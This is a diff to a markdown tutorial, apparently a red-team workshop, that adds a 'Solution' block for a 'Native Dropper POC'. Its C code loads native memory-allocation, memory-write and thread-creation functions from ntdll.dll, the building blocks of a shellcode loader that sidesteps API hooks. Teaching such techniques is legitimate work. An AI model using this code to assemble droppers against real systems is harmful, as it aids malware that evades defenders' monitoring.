@@ -56,14 +56,29 @@ To load the native functions directly from ntdll.dll, we need to load them manua
     
 ```
 // Load native API functions from ntdll.dll
+    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");    
+```    
+     
+</details>    
+
+<details>
+    <summary>Solution</summary>
+If it was at this time not possible for you to complete the code for the three missing native functions, you can use the following code and copy it into the Native Dropper POC. 
+
+```
+// Load native API functions from ntdll.dll
     PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
     PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
     PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
     PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
     PNTCLOSE NtClose = (PNTCLOSE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
     PNTFREEVIRTUALMEMORY NtFreeVirtualMemory = (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
-```    
-</details>    
+```        
+
+</details>     
+     
+     
+     
 
 For memory allocation, we replace the Windows API VirtualAlloc with the native API **NtAllocateVirtualMemory**.
 <details>
